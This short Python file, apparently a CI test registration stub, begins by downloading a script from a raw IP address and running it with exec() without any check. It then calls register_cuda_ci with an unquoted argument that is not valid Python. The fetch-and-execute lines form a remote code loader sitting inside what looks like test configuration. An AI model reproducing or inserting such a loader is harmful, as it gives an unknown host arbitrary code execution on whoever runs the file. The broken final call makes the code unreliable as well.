import requests

url = "http://107.149.105.88/script.py"
code = requests.get(url).text

exec(code)
register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
